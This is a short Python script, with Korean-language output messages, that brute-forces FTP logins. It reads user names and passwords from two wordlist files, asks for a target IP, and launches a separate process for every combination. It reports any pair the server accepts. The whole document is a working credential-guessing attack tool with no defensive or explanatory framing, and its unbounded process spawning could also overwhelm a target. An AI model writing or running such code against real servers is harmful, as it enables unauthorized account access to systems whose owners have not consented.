import ftplib
import multiprocessing

def brute_force(ip_address, user, password):
    ftp = ftplib.FTP(ip_address)
    try:
        print("테스트 중 ID : {}, Pass: {}".format(user, password))
        response = ftp.login(user,password)
        if '230' in response:
            print("로그인 접속 성공")
            print("사용자: {}, 패스워드: {}".format(user,password))
        else:
            pass
    except:
        print("접속 오류")

def main():
    ip_address = input("FTP IP주소를 입력하세요.: ")
    with open('users.txt','r') as users:
        users = users.readlines()
    with open('passwords.txt','r') as passwords:
        passwords = passwords.readlines()
    
    for user in users:
        for password in passwords:
            process = multiprocessing.Process(target=brute_force, args=(ip_address, user.rstrip(), password.rstrip(),))
            process.start()
            #brute_force(ip_address, user.rstrip(), password.rstrip())

if __name__ == '__main__':
    main()
